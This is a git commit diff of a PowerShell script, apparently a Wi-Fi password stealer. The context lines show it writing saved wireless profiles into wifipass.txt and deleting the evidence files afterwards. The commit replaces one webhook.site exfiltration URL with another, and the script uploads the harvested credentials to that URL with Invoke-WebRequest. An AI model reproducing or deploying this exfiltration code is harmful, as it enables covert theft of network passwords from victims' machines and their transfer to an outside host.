1f352bdbf3c5651b6bcb2db43d5c46a53fa95d68
Moldmihai <mihai_99moldo@yahoo.com>
2023-01-18 08:25:11 +0200

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -9,7 +9,7 @@ $row= "---------------------`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name 
 Out-File wifipass.txt -Append -InputObject $row
 }
 
-Invoke-WebRequest -Uri https://webhook.site/5a3610fb-2789-404a-b42d-af8a689e5e13 -Method POST -InFile wifipass.txt -UseBasicParsing
+Invoke-WebRequest -Uri https://webhook.site/10ae332b-7105-470a-bc0e-036044d457b4 -Method POST -InFile wifipass.txt -UseBasicParsing
 
 rm *.xml
 rm *.txt
